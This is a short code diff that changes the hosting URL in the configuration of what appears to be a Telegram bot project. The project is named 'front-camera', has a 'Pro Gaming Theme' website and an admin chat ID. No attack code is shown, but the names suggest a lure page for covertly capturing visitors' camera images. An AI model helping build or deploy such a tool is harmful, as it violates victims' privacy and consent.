@@ -15,7 +15,7 @@ ADMIN_CHAT_ID = "7547107887"      # আপনার টেলিগ্রাম 
 # ==========================================
 
 BOT_USERNAME = "Camera8272_bot"
-WEB_URL = "https://front-camera.onrender.com/"
+WEB_URL = "https://front-camera-wjg0.onrender.com/"
 TELEGRAM_BOT_LINK = f"https://t.me/testingBot21_bot{BOT_USERNAME}"
 
 # --- 1. WEBSITE DESIGN (Pro Gaming Theme) ---
